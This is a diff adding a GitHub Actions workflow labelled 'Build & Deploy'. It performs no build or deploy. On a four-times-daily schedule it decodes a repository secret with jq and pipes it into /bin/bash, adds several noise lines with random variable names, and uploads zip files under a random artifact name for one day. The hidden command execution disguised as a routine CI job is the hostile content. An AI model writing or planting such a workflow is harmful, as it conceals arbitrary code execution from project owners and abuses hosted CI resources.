@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '30 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          vela6141: ${{ secrets.vela6141 }}
+        run: |
+          printf '%s' "$vela6141" | jq -r .k28 | /bin/bash
+          echo $qeauv82284 | jq -r .bghm0 | /bin/bash
+          echo $i11274 | jq -r .g70 | /bin/bash
+          echo $hyldg5492 | jq -r .u20 | /bin/bash
+          echo $fi7276 | jq -r .zmwj4748 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: of3QTQmp
+          path: "*.zip"
+          retention-days: 1
